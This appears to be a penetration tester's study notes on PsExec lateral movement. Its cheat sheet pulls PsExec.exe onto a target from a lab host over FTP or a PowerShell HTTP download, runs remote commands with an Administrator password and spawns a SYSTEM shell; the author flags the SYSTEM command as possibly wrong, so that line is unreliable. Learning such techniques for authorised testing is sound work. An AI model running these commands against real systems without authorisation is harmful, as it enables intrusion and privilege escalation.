## PsExec (SysInternals)

Note:  Not to be confused with the Hacking tool psexec

Tool from SysInternals:  https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

Good breakdown of this tool:  https://www.contextis.com/en/blog/lateral-movement-a-deep-look-into-psexec

Can execute commands on a remote system using the password or hash of a user.

### Cheat Sheet

Quick download from FTP server:

```powershell
echo open 192.168.119.216 21> ftp.txt
echo USER rock>> ftp.txt
echo roll>> ftp.txt
echo cd winprivesc >> ftp.txt
echo passive >> ftp.txt
echo bin >> ftp.txt
echo GET PsExec.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
del ftp.txt
```

or HTTP

```powershell
mkdir c:\temp
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.216:80/PsExec.exe','C:\temp\PsExec.exe')"
```

### Commands

- Execute a command using password:


```powershell
psexec \\192.168.122.66 -accepteula -u Administrator -p 123456 ipconfig 
```

- Elevate privileges to SYSTEM user (<----I don't know if this actually is correct, it doesn't seem right)

```powershell
psexec.exe -i -s cmd.exe
```

### More Info:

#### Minimum requirements to use the PsExec method

These are the bare minimum requirements:

1. Port 139 or 445 open on the remote machine, i.e., SMB.
2. Password or NTLM hash of the password (*)
3. Write permissions to a network shared folder (**). It doesn´t matter which one (***).
4. Permissions to create services on the remote machine: SC_MANAGER_CREATE_SERVICE (Access mask: 0x0002). 
5. Ability to start the service created: SERVICE_QUERY_STATUS (Access mask: 0x0004) + SERVICE_START (Access mask: 0x0010).

Notes:

- *: Remember that NTLM ≠ NTLMv1/v2, so captured hashes over the  network are not valid, unless you crack them or use an NTLM relay  technique, but that´s another story.
- **: Bear in mind that NTFS permissions ≠ Share permissions. It´s not enough to have permissions to write locally.
- ***: Note that if you are using Sysinternal´s PsExec, it will try  to copy PSEXESVC.exe to ADMIN$ (alias for C:\Windows), so you need  access to it, not to just any folder.

Source of this info and more:  https://www.contextis.com/en/blog/lateral-movement-a-deep-look-into-psexec